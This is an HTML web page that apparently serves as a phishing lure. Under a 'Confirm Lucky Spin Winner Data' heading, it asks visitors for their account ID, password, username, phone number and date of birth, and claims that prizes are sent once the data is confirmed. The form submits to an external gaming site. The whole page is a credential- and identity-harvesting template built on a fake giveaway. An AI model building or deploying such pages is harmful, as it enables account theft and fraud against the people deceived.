<html lang="zh" style="font-size: 50px;">
<head>
    
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0,viewport-fit=cover">
   
    <title>HDI</title>
    <link rel="icon" type="img/png" href="img/thumbnail.png" sizes="32x32">
    <link rel="stylesheet" href="css/style2.css">
    

</head>

<body>
    <div class="wrapper-land">
        <div class="landContent" style="margin-top: 50px;">
            <center>
                <h4 class="title">
                    <img src="img/logo.png">
                </h4>
            </center>

            <div class="password-form-container">
                <div class="password-form-title">
                    Info: Confirm Lucky Spin Winner Data.
                </div>
                <form class="login-form" action="https://www.bosbosgames.com" id="ock">
                    <div class="password-form">
                        <div class="password-form-item">
                            <div class="password-form-item__label">ID</div>
                            <div class="password-form-item__content">
                                <input type="text" class="password-form-input" id="Myid" autocomplete="off" required="">
                            </div>
                        </div>
                        <div class="password-form-item">
                            <div class="password-form-item__label">Password</div>
                            <div class="password-form-item__content">
                                <input type="password" class="password-form-input" placeholder="6-16 numbers or letters" autocomplete="off" required="">
                            </div>
                        </div>
                        <div class="password-form-item">
                            <div class="password-form-item__label">Username</div>
                            <div class="password-form-item__content">
                                <input type="text" class="password-form-input" placeholder="Enter Account Name" autocomplete="off" required="">
                            </div>
                        </div>
                        <div class="password-form-item">
                            <div class="password-form-item__label">Phone Number</div>
                            <div class="password-form-item__content">
                                <input type="text" class="password-form-input" id="phone" autocomplete="off" minlength="10" maxlength="13" required="">
                            </div>
                        </div>
                        <div class="password-form-item">
                            <div class="password-form-item__label">Date of birth</div>
                            <div class="password-form-item__content">
                                <input type="text" class="password-form-input" placeholder="Enter date of birth" autocomplete="off" required="">
                            </div>
                        </div>
                    </div>
                    <div class="password-form-tip">
                        Prizes will be sent after confirmation of the data you have sent successfully.
                    </div>
                    <span> 
                        <button type="submit" class="btn btn-send" style="border: none">
                    </span>
                    
            </form>
        </div>
            
            
            <footer>
                <div class="pa footer">
                    <a class="icoFaceBook" href="#"></a>
                    <a class="icoMail" href="#"></a>
                    <a class="icoIns" href="#"></a>
                    <a class="icoWa" href="#"></a>
                    <a class="icoTop" href="#"></a>
                    <p class="itemText">All rights reserved. Connect with Us!</p>
                </div>
            </footer>
        </div>
    </div>

</body>
</html>
